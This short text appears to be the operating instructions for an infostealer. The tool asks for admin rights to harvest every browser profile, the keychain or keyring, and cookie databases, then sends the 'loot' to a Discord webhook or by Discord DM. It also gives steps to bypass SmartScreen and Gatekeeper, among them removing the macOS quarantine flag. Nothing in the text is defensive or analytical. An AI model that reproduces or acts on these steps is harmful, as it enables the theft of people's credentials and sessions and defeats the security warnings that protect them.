admin is requested on launch. Windows raises a UAC prompt, macOS a password dialog, Linux sudo. It needs the rights to read every browser profile, the login keychain / keyring, and locked database files. Decline and it still runs, just with less reach.

run it

  1. the file already downloaded — check your downloads folder.
  2. run it and approve the admin prompt.
  3. paste a Discord webhook URL when asked — or press enter and it DMs the loot to the account it finds.
Windows: double-click, accept the UAC dialog. SmartScreen may say "unknown publisher" → More info → Run anyway.
macOS: chmod +x "RUN ME.command" then ./"RUN ME.command". If Gatekeeper blocks it: xattr -d com.apple.quarantine "RUN ME.command".
Linux: chmod +x "RUN ME.sh" && ./"RUN ME.sh", then your sudo password.
No Python, no pip, no npm. Windows uses in-box PowerShell; macOS/Linux use in-box curl, awk, openssl, sqlite3 and find. Close your browsers first — Chrome holds a lock on the cookie DB.
